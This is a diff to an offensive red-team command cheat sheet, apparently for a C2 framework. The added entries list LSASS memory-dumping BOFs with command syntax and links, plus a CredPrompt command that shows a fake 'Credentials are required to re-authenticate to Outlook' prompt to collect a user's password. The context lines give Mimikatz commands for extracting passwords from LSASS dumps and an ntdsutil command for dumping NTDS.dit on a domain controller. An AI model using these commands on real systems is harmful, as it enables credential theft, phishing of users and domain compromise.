@@ -564,6 +564,13 @@ Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
 ```
 execute-assembly C:\SafetyKatz.exe --> Dumps LSASS process to .dmp file on the local system
 ```
+LSASS dump BOFs
+```
+minidumpwritedump --> https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump
+nanodump --> https://github.com/fortra/nanodump
+ppldump <YOUR_PROTECTED_PROCESS_PID> --> https://github.com/EspressoCake/PPLDump_BOF
+static_syscalls_dump <PID> C:\Users\USER\Desktop\output.dmp --> https://github.com/ajpc500/BOFs/blob/main/StaticSyscallsDump/README.md
+```
 Extracting passwords/hashes offline from LSASS dump using Mimikatz (**ON YOUR OWN SYSTEM!**)
 ```
 mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
@@ -616,6 +623,12 @@ powerpick Copy-VSS -DestinationDir C:\temp
 NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
 run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
+```
+
+### Credential Prompt
+[CredPrompt](https://github.com/guervild/BOFs/tree/dev/CredPrompt) to ask the current user for their username/password.
+```
+credprompt "Credentials are required to re-authenticate to Outlook:"
 ```
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Email
